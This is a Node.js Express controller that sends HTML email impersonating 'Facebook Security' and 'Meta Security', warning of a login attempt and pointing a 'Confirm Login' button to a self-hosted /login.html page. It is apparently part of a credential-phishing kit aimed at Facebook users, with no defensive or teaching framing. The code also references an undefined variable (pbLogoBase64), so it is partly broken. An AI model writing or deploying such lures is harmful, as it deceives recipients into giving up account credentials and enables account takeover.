// controllers/emailController.js
const sendEmail = require('../services/emailService');
const path = require('path');
const fs = require('fs');

// Get PB logo from local public folder
const fLogoPath = path.join(__dirname, '../public/images/logo.png');
const fLogoBase64 = fs.readFileSync(fLogoPath).toString('base64');
const fLogoDataURL = `data:image/png;base64,${pbLogoBase64}`;

// Email template function
const emailTemplate = (loginLink, userEmail) => `
<div style="background:#18191a;color:#e4e6eb;font-family:Arial,sans-serif;padding:30px;">

  <!-- Top line with f Logo left -->
  <div style="display:flex;align-items:center;">
    <img src="${fLogoDataURL}" 
         alt="f Logo" width="50" height="50" style="margin-right:15px;">
    <hr style="flex-grow:1;border:1px solid #3a3b3c;margin:0;">
  </div>

  <!-- Greeting -->
  <p style="margin-top:20px;">Hello,</p>

  <!-- Main message -->
  <p>We noticed a login attempt to your Facebook Security portal. This notification is to keep your account secure.</p>

  <!-- Bold section title -->
  <b>About this change</b>
  <p>If you recognize this login, no action is needed. Otherwise, please review your account immediately using the button below.</p>

  <!-- Full-width Confirm Login Button -->
  <a href="${loginLink}" 
     style="display:block;text-align:center;background:#1a73e8;color:#fff;padding:15px;text-decoration:none;border-radius:5px;margin:20px 0;font-weight:bold;">
    Confirm Login
  </a>

  <!-- If this was you section -->
  <p>If this was you, no further action is needed. If not, please secure your account immediately.</p>

  <!-- Bottom line -->
  <hr style="border:1px solid #3a3b3c;margin:10px 0;">

  <!-- Footer -->
  <p>© 2026 Meta Security · <a href="${loginLink}" style="color:#1a73e8;text-decoration:none;">Learn More</a></p>
  <p>Sent to ${userEmail}</p>
</div>
`;

exports.sendLoginEmail = async (req, res) => {
  try {
    const { email } = req.body;
    if (!email) return res.status(400).json({ success:false, message:"Email required" });

    // Generate login link pointing to Railway frontend
    const loginLink = `${process.env.FRONTEND_URL || "http://localhost:3000"}/login.html`;

    const sent = await sendEmail(
      email,
      "🔐 Confirm Your Login - Facebook Security",
      emailTemplate(loginLink, email)
    );

    if (!sent) return res.status(500).json({ success:false, message:"Email failed to send" });

    return res.status(200).json({ success:true, message:"Email sent successfully" });

  } catch (err) {
    console.error("Email sending error:", err);
    return res.status(500).json({ success:false, message:"Server error" });
  }
};